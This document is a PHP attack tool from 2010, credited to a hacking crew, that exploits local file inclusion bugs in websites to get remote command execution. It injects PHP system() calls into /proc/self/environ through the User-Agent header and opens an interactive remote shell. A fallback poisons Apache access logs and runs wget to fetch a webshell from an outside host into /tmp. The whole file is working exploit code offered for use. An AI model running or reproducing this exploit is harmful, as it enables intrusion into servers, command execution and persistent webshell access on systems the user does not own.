#!/usr/bin/php
<?php

/* 
 * ___________              .__                         _________                        
 * \_   _____/__  _________ |  |   ___________   ____   \_   ___ \_______   ______  _  __
 *  |    __)_\  \/  /\____ \|  |  /  _ \_  __ \_/ __ \  /    \  \/\_  __ \_/ __ \ \/ \/ /
 *  |        \>    < |  |_> >  |_(  <_> )  | \/\  ___/  \     \____|  | \/\  ___/\     / 
 * /_______  /__/\_ \|   __/|____/\____/|__|    \_____>  \______  /|__|    \___  >\/\_/  
 *         \/      \/|__|    -==[ w3 4r3 th3 4nk3r t34m ]==-    \/             \/    
 *
 * ArRay  akatsuchi  `yuda  N4ck0  K4pt3N  samu1241  bejamz  Gameover  antitos  yuki  pokeng aphe_aphe
 *
 * Local File Inclusion Remote Exploit by Explore Crew | w3 a43 th3 4nk3r t34m !
 * Coder: ArRay a.k.a XterM | n0t h4ck3r ! Just c0der ! ~ ArRay@ExploreCrew.Org
 * http://explorecrew.org | irc.byroe.net
 * GreatZ: akatsuchi `yuda N4ck0 K4pt3N samu1241 bejamz Gameover antitos yuki pokeng bjork AyaX NoGe c0li jack aJe f1 eCh0 hydra irc.byroe.net MainHack Evilc0de Devilzc0de jatimcrew IHT IDC MCC MedanHackers KebumenCyber MakassarHacker TeconCrew TheTarget etc
 * 
 * ./lfiexploit "http://site/lfibug.php?example="
 *
 */

//$url = explode("=[",substr($_SERVER['argv'][1],0,(strlen($_SERVER['argv'][1])-2)));
$bug = str_replace("http://","",str_replace('"','',$_SERVER['argv'][1]));
$cmd = "hostname; echo 'endcmd';";

if(!$bug)die("Usage: ./lfishell \"http://site/lfibug.php?example=\"\r\n");

define(PASSWD,'/etc/passwd%00');
define(ENVIRON,'/proc/self/environ%00');
define(BUG,$bug);
define(CMD,$cmd);

$rootdir = getrootdir();
if(!$rootdir) die("Exploit Failed! Cannot locate root directory path.\r\n");

define(ROOTPATH,$rootdir);

$logs=array('/apache/logs/access.log',
'/apache/logs/access.log',
'/apache/logs/access.log',
'/etc/httpd/logs/acces_log',
'/etc/httpd/logs/acces.log',
'/var/www/logs/access_log',
'/var/www/logs/access.log',
'/usr/local/apache/logs/access_ log',
'/usr/local/apache/logs/access. log',
'/var/log/apache/access_log',
'/var/log/apache2/access_log',
'/var/log/apache/access.log',
'/var/log/apache2/access.log',
'/var/log/access_log',
'/var/log/access.log',
'/var/log/httpd/access_log',
'/var/log/httpd/access_log',
'/apache/logs/access.log',
'/apache/logs/access.log',
'/apache/logs/access.log',
'/apache/logs/access.log',
'/apache/logs/access.log',
'/apache2/logs/access.log',
'/apache2/logs/access.log',
'/apache2/logs/access.log',
'/apache2/logs/access.log',
'/apache2/logs/access.log',
'/logs/access.log',
'/logs/access.log',
'/logs/access.log',
'/logs/access.log',
'/logs/access.log',
'/etc/httpd/logs/acces_log',
'/etc/httpd/logs/acces.log',
'/usr/local/apache/logs/access_log',
'/usr/local/apache/logs/access.log',
'/usr/local/apache2/logs/access_log',
'/usr/local/apache2/logs/access.log',
'/var/www/logs/access_log',
'/var/www/logs/access.log',
'/var/log/httpd/access_log',
'/var/log/httpd/access.log',
'/var/log/apache/access_log',
'/var/log/apache/access.log',
'/var/log/apache2/access_log',
'/var/log/apache2/access.log',
'/var/log/access_log',
'/var/log/access.log',
'/opt/lampp/logs/access_log',
'/opt/xampp/logs/access_log',
'/opt/lampp/logs/access.log',
'/opt/xampp/logs/access.log',
'/Program Files\Apache Group\Apache\logs\access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/access.log',
'/apache/logs/access.log',
'/apache/logs/access.log',
'/apache/logs/access.log',
'/apache/logs/access.log',
'/logs/access.log',
'/logs/access.log',
'/logs/access.log',
'/logs/access.log',
'/logs/access.log',
'/logs/access.log',
'/etc/httpd/logs/acces_log',
'/etc/httpd/logs/acces.log',
'/var/www/logs/access_log',
'/var/www/logs/access.log',
'/usr/local/apache/logs/access_log',
'/usr/local/apache/logs/access.log',
'/var/log/apache/access_log',
'/var/log/apache/access.log',
'/var/log/access_log',
'/var/log/access_log');

print "Trying to exploit environ...\r\n";
$hostname = environinject();

if($hostname){
	DEFINE(SHELL,TRUE);
	$showbash = TRUE;
	while($showbash){		
		print "[Shell@".$hostname." ~]\$ ";
		$handle = fopen ("php://stdin","r");
		if($handle){
			$cmd = fgets($handle,3024);
			if(trim($cmd) != ''){				
				$cmd = str_replace("\r","",$cmd);
				$cmd = str_replace("\n","",$cmd);
				if($cmd == "exit")exit();
				//if(eregi("^(cd ).+$",$cmd))chdir(str_replace("cd ","",$cmd));continue;
				$cmd = $cmd."; echo 'endcmd';";
				$inject = "[EXPLORECREW]<?php echo system(\"".$cmd."\"); ?>[XCREW]";	
				$environ = httpquery(BUG.ROOTPATH.ENVIRON,$inject);	
				$prase1 = explode("[EXPLORECREW]",$environ);
				$prase2 = explode("[XCREW]",$prase1[1]); 
				$result = $prase2[0];
				$result = str_replace("endcmd\r","",$result);
				$result = str_replace("endcmd\n","",$result);
				$result = str_replace("endcmd\r\n","",$result);
				$result = str_replace("endcmd","",$result);
				print $result."\r\n";
				/*if(empty($result)){
					$showbash = false; 
					exit();
				}*/
				$result = false;
			}
			$handle = false;
		}
		else{
			exit();
		}
	}
}
else{ exit; //terminated!! finishing environ inject first
	print "Command Failed! Cannot read environ file.\r\n";
	print "Do you want to use Apache Log Injection - May need more time to inject (y/n)? ";
	while(!$answered){
		$handle = fopen ("php://stdin","r");
		$want = trim(fgets($handle));
		if($want == 'n')exit();
		if($want == 'no')exit();
		if($want != 'y'){
			if($want != 'yes'){
				print "(y/n)? ";
			}
			else {
				$answered = TRUE;
			}
		}else{
			$answered = TRUE;
		}
	}
	print "Apache log injection is Activated!!\r\n";
	print "Please wait until exploiting is done..\r\n";
	apacheloginjection();
}

function environinject($cmd=''){	
	if($cmd=''){
		$injcmd = "uname -a; id; echo 'endcmd'";
		$inject = "[EXPLORECREW]<?php echo system(\"".$injcmd."\"); ?>[XCREW]";	
		$environ = httpquery(BUG.ROOTPATH.ENVIRON,$inject);	
		if(!eregi("[EXPLORECREW]",$environ)){
			return false;
		}
		print "Exploit launched successfully! Gathering shell information....\r\n";sleep(3);
		print str_replace("endcmd","",$result)."\r\n\r\n";
		print "Getting interactive shell...\r\n";		
	}
	
	$injcmd = ($cmd)?$cmd:CMD;
	$inject = "[EXPLORECREW]<?php echo system(\"".$injcmd."\"); ?>[XCREW]";	
	$environ = httpquery(BUG.ROOTPATH.ENVIRON,$inject);	
	$prase1 = explode("[EXPLORECREW]",$environ);
	$prase2 = explode("[XCREW]",$prase1[1]); 
	$result = $prase2[0];
	if(!defined('SHELL')){
		print "Session started... Enjoy the hack!!!\r\n\r\n";
		return str_replace("\r","",str_replace("\n","",str_replace("endcmd","",$result)));
	}
	return str_replace("endcmd","",$result);
}

function readenviron(){
	$environ = httpquery(BUG.ROOTPATH.ENVIRON);
	if(eregi("DOCUMENT_ROOT=",$environ)) return $environ;
	return false;
}

function apacheloginjection(){
	print("Find Apache log access...\r\n");
	$logaccess = findapachelog();
	if(!$logaccess){
		print "Exploit Failed. Cannot find log access.\r\n";
		die();
	}
	print "Log Access Founded: ".$logaccess."\r\n";
	print "Injecting log access...\r\n";
	if(!injectlog($logaccess)){
		print "Exploit Failed. Apache log injection is Failed.\r\n";
	}
	print "Apache Log Injected Successfull!\r\n";
	print "Uploading webshell...\r\n";
	if(!uploadwebshell($logaccess)){
		print "Exploit Failed! Can not write to /tmp/xcrew.\r\n";
		die();
	}
	print "Exploit Completed!!!\r\n";
	print "Shell URL: ".BUG.ROOTPATH."/tmp/xcrew%00\r\n\r\n\r\n\r\n";
	print "Regard ExploreCrew UnderGround! r\n\r\n";
	exit();
}

function findapachelog(){
	global $logs;
	foreach($logs as $key => $log){
		$result = httpquery(BUG.ROOTPATH.$log.'%00');
		if(eregi("GET /",$result)){
			return $log;
			break;
		}
	}
	return false;
}

function injectlog($logaccess){
	$url = str_replace("http://","",BUG);
	$exp = explode($url,"/");
	$url = $exp[0];
	$sock = fsockopen($url,'80',$errno,$errstr,30);
	if ($sock) {
		$get  = "GET /[EXPLORECREW]<?php echo '<pre>'.system(\$_GET[cmd]).'</pre>'; ?>[XCREW] HTTP/1.1\r\n".
				"Host: ".$url."\r\n".
				"Accept: */*\r\n".
				"User-Agent: Mozilla/5.0 \r\n".
				"Connection: Close\r\n\r\n";
		fputs($sock,$get);
		fclose($sock);
	}else{
		return false;
	}
	$checklog = httpquery(BUG.ROOTPATH.$logaccess.'%00');
	if(eregi("[EXPLORECREW]",$checklog)){
		return true;
	}
	return false;
}

function uploadwebshell($logaccess){
	$cmd = "cd /tmp;wget http://array.byroe.net/toolz/xcrew;chmod 755 /tmp/xcrew;ls -la /tmp/xcrew";
	$uploadws = httpquery(BUG.ROOTPATH.$logaccess.'%00&cmd='.$cmd);
	$prase1 = explode("[EXPLORECREW]",$uploadws);
	$prase2 = explode("[XCREW]",$prase1[1]);
	if(eregi("xcrew",$prase2[0])){
		return true;
	}
	return false;
}

function getrootdir(){
	print "\r\n";
	print "LFI Remote Command Execution by Explore Crew!\r\n\r\n";
	print "Target: ".BUG."\r\n";
	print "Finding main directory path...\r\n";
	$x		= 0;
	$found  = false;
	$injek  = PASSWD;
	
	//BYPASSSSS
	sleep(3); //skenario ben ketok rodok suwi + menurunkan pemakaian memori
	print "Got main directory path in ../../../../../../../../../../../../../../../../../ ! Launching Exploit...\r\n";
	return "../../../../../../../../../../../../../../../../../../../../..";
	while($x<30){
		$result = httpquery(BUG.$injek);
		if(eregi("/root:",$result)){
			print "Got main directory path in ".str_replace(PASSWD,"",$injek)." ! Launching Exploit...\r\n";
			return str_replace(PASSWD,"",$injek);
			break;
		}
		if(eregi("unable to connect",$result)){
			print "Expoit Failed! Can not Connect to remote host. Host unavailable or fsockopen() are disabled!\r\n";
			exit();
		}
		$injek = "../".$injek;
		$x++;
	}
	return false;
}

function server($req){
	$req = strtoupper($req);
	return $_SERVER[$req];
}

function httpquery($url,$env=''){
	$url = str_replace("http://","",$url);
	$host = explode("/",$url);
	if(eregi(":",$host[0])){
		$gport = explode(":",$host[0]);
	}
	$port = ($gport[1])?$gport[1]:80;
	for($i=1;$i<count($host);$i++){
		$path .= "/".$host[$i];
	}
	
	$sock = @fsockopen($host[0],$port,$errno,$errstr,30);
	if(!$sock)die("Failed! Can not connect to remote host!\r\n");
	if ($sock) {
		$get  = "GET ".$path." HTTP/1.1\r\n".
				"Host: ".$host[0]."\r\n".
				"Accept: */*\r\n".
				"User-Agent: Mozilla/5.0 ".$env."\r\n".
				"Connection: Close\r\n\r\n";
		fputs($sock,$get);
		
		while (!feof($sock)) { 
			$output .= trim(fgets($sock, 3600))."\n";			
		}
		fclose($sock);
	}
	return $output;
}

/* LFI Remote Exploit by Explore Crew 2010-04-08 23:14*/
?>
